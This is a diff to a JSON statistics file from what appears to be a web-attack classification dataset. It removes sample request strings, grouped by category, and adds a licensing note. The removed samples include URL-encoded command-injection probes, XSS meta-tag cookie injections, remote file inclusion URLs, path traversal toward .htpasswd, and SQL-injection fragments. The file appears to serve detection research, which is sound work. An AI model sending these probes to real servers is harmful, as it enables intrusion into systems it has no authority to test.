@@ -15,54 +15,6 @@
     "traversal or sensitive file path": 120,
     "SQL words": 56
   },
-  "examples": {
-    "other": [
-      "%26%20sleep%200%20%26%26%20str%3D%24%28echo%20CCUVUA%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24",
-      "%3B%20str%3D%24%28echo%20JHAATD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%2",
-      "/main.php?logout='\\x0duname >q29695698 #",
-      "%27%3B%20str%3D%24%28echo%20ASBPAS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20the"
-    ],
-    "scanner probe of a known script path (no payload)": [
-      "/phpmyadmin/cwmail.exe",
-      "/javascript/traffic.exe",
-      "/javascript/java.exe",
-      "/javascript/wwwuser.exe"
-    ],
-    "shell / command shapes": [
-      "echo%20GCITOP$((61%2B30))$(echo%20GCITOP)GCITOP//",
-      "'%0aecho%20BTIFJC$((66%2B80))$(echo%20BTIFJC)BTIFJC'",
-      "'.print(`echo%20JLXMKL\\necho%20$((67%2B26))\\necho%20JLXMKL\\necho%20JLXMKL`)%3B.%25252522JLXMKL",
-      "%22|echo$IFSCSECOD$((94%2B97))$(echo$IFSCSECOD)CSECOD\""
-    ],
-    "script/event-handler markup (XSS-like)": [
-      "/lmw4r201.jsp?<meta http-equiv=set-cookie content=\"testwews=8477\">",
-      "/q703m78q.aspx?<meta http-equiv=set-cookie content=\"testvowq=604\">",
-      "/yef5f3d5.cgi?<meta http-equiv=set-cookie content=\"testcrcv=6167\">",
-      "/horde/imp/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x"
-    ],
-    "remote file inclusion / URL in parameter": [
-      "/script/plugins/phpgacl/admin/index.php?path_inc=http://192.168.202.118:8080/tzhfyzkbomspvm?",
-      "/opensiteadmin/scripts/classes/loginmanager.php?path=http://192.168.202.96:8080/no4ghqiguzhst?\\x00",
-      "/news.php?config[script_path]=http://192.168.202.118:8080/2aibfaczmac8??",
-      "/scripts/nx/common/cds/menu.inc.php?c_path=http://xxxxxxxx/"
-    ],
-    "plain path, no parameters": [
-      "/subscriptions_t/",
-      "/aoy7kzbh.passwd",
-      "/javascript/document.bat",
-      "/2000transcripts/"
-    ],
-    "traversal or sensitive file path": [
-      "/..///..///..///..///..///..///..///{FILE}",
-      "/examples/jsp/error/misc/audio.php?recording=../version.inc",
-      "/cgi-win/.htpasswd",
-      "..%255c"
-    ],
-    "SQL words": [
-      "/main.php?logout='|sleep\\x098\\x09#",
-      "/examples/jsp/sessions/view_user.php?list=1&letter=&sort_by='select",
-      "/main.php?logout='|sleep\\x097\\x09#",
-      "insert"
-    ]
-  }
+  "examples": {},
+  "note": "examples removed: the second source has no stated licence and is not redistributed. Regenerate locally with the command in docs/FINAL_ENGINEERING_REPORT.md."
 }
